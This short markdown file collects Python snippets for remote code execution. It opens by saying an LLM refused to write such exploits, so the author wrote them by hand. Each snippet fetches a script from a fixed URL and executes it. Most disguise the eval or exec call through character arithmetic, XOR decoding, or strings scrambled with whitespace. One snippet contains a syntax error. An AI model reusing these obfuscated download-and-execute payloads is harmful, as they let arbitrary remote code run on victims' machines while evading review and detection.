# Python RCE examples

The LLM does not want to write remote-code execution exploits, so I reverted to using natural neural networks.

Original:

```python
url = "https://jacek.migdal.pl/speed.py"
content_from_site = requests.get(url).text
__builtins__.__dict__[''.join(chr(100 + i) for i in [2*2*2, -1-1-1, (1<<4) + 2, 1])[::-1]](content_from_site)
```

Urlib double eval:

```python
b="""
import urllib.request
url = "https://jacek.migdal.pl/speed.py"
content_from_site = urllib.request.urlopen(url).read().decode()
__builtins__.__dict__[''.join(chr(100 + i) for i in [2*2*2, -1-1-1, (1<<4) + 2, 1])[::-1](content_from_site)
"""
eval(b)
```

Minimal:

```
import urllib.request; exec(urllib.request.urlopen("https://jacek.migdal.pl/speed.py").read().decode())
```

Obfuscated:

```
nice = """
   im   po  rt#ur   llib.r eq   ue st;#exe c(urll
   ib   .r eq   ue st      .u   rl op      en   ("
   https:/ /jacek. mi      gdal.pl /spee   d.py")
   .r   ea d(   ). de      co   de ()      )
"""
exec(nice.replace(" ", "").replace("\n", "").replace("#", " "))
```

Obfuscated 2:

```
exec("""
   im   po  rt#ur   llib.r eq   ue st;#exe c(urll
   ib   .r eq   ue st      .u   rl op      en   ("
   https:/ /jacek. mi      gdal.pl /spee   d.py")
   .r   ea d(   ). de      co   de ()      )
""".translate(str.maketrans({' ': '', '\n': '', '#': ' '})))
```

```python
import urllib.request
url = "https://jacek.migdal.pl/speed.py"
content_from_site = urllib.request.urlopen(url).read().decode()
__builtins__.__dict__[''.join(chr(i ^ 0x42) for i in [39,52,35,46])](content_from_site)
```
